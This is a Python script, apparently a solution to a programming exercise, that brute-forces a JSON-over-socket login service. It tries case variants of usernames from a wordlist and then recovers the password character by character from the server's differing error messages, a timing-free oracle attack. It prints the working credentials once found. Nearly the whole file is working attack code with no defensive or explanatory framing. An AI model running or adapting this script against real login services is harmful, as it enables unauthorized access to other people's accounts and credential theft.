import argparse
import json
import socket
import string


# Functions generates a letter or a number
def hack_by_letter():
    list_symbols = string.ascii_letters + string.digits
    for i in list_symbols:
        yield i


# Function checks if a password consists only of numbers
def all_numbers(pw):
    check = [k for k in pw if k in string.digits]
    if len(check) == len(pw):
        # print(pw)
        return True


# Function generates uppercase and lowercase combinations of password
def hack(password):
    count_comb = 2 ** len(password)

    if all_numbers(password) == True:
        yield password
    else:
        for a in range(count_comb):
            word = list(password.lower())
            binary = str(format(a, 'b'))
            if len(binary) < len(word):
                for i in range(1, len(word)):
                    if len(binary) == i:
                        add = (len(word) - i) * '0'
                        binary = f'{add}{binary}'
            for index, letter in enumerate(word):
                if letter in string.ascii_lowercase:
                    if binary[index] == '0':
                        word[index] = letter.lower()
                    if binary[index] == '1':
                        word[index] = letter.upper()
            yield ''.join(word)


# File with login-passwords
my_file = 'logins.txt'
password_file = open(my_file, 'r')
max_lines = 25

# Parameter for maximum number of iterations in hack()
max_n = 100000

# Variables for password
guessed_password = []
str_guessed_password = ""
range_symbols = 62
range_pw_length = 50

parser = argparse.ArgumentParser()
parser.add_argument("host")
parser.add_argument("port")
args = parser.parse_args()

client = socket.socket()
address = (args.host, int(args.port))
client.connect(address)

# Guess login
for i in range(max_lines):
    line = password_file.readline().strip()
    hack_generator = hack(line)
    for a in range(max_n):
        try:
            attempt = next(hack_generator)
            dict_attempt = {'login': attempt, 'password': ' '}
            dict_json = json.dumps(dict_attempt)
            message = dict_json.encode('utf8')
            client.send(message)
            response = client.recv(1024)
            response = response.decode('utf8')
            response = json.loads(response)
            if response['result'] == "Wrong password!":  # Login successful
                for k in range(range_pw_length):
                    hack_generator_2 = hack_by_letter()
                    for j in range(range_symbols):
                        attempt_pw = next(hack_generator_2)
                        attempt_long = str_guessed_password + attempt_pw
                        dict_attempt = {'login': attempt, 'password': attempt_long}
                        dict_json = json.dumps(dict_attempt)
                        message = dict_json.encode('utf8')
                        client.send(message)
                        response = client.recv(1024)
                        response = response.decode('utf8')
                        response = json.loads(response)
                        if response['result'] == "Exception happened during login":
                            guessed_password.append(attempt_pw)
                            str_guessed_password = ''.join(guessed_password)
                            break
                        elif response['result'] == "Connection success!":
                            print(dict_json)
                            break
            elif response == "Too many attempts!":
                break
        except Exception:
            break

password_file.close()
client.close()
